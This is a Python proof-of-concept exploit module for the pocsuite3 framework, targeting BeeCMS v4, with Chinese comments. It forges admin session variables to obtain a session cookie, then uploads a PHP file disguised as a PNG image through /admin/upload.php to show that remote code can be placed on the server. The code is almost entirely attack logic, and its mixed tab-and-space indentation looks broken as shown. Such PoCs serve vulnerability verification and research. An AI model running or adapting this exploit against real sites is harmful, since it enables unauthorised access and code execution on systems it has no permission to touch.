from pocsuite3.api import Output,POCBase,register_poc,requests


class BeeCMS(POCBase):
	vulID = '1001'
    version = '1.0'
    author = ['一寸一叶']
    vulDate = '2014'
    createDate = '2020-11-20'
    updateDate = '2020-11-20'
    references = 'https://bbs.ichunqiu.com/thread-13977-1-1.html'
    name = 'BeeCMS v4 后台上传getshell'
    appPowerLink = 'http://www.beescms.com/'  # 漏洞产商主页
    appName = 'BeeCMS'  # 漏洞应用名称
    appVersion = 'v4'  # 漏洞影响版本
    vulType = 'Upload'  # 漏洞类型
    desc = '''/admin/upload.php任意文件上传'''  # 在漏洞描述填写
    samples = []  # 测试成功网址
    install_requires = []  # PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''PoC用法描述'''  # 在PoC用法描述填写

	def _verify(self):
		result = {}
	    if 'index.php' in self.url:
	        attack_url = self.url.replace('index.php','admin/upload.php')
	    else:
	        attack_url = self.url+'/admin/upload.php'

	    get_cookie = {
	        '_SESSION[login_in]':'1',
	        '_SESSION[admin]':'1',
	        '_SESSION[login_time]':'99999999999'
	    }

	    res = requests.post(self.url,get_cookie)
        cookie = res.cookies['PHPSESSID']
        if cookie:
            print('成功获取cookie：%s' %cookie)
            payload = {
                'up':(
                    'shell.php',
                    '<?php phpinfo();?>',
                    'image/png',
                ),
            }
            attack_cookie = {'PHPSESSID':cookie}
            res = requests.post(attack_url,cookies=attack_cookie,files=payload)
            if '.php' in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = attack_url
                result['VerifyInfo']['Postdata'] = payload
        return self.parse_output(result)
    def _attack(self):
    	return self._verify()
    def parse_output(self,result):
    	output = Output(self)
    	if result:
    		output.success(result)
    	else:
    		output.fail('target is not vulnerable')
    	return result
register_poc(BeeCMS)
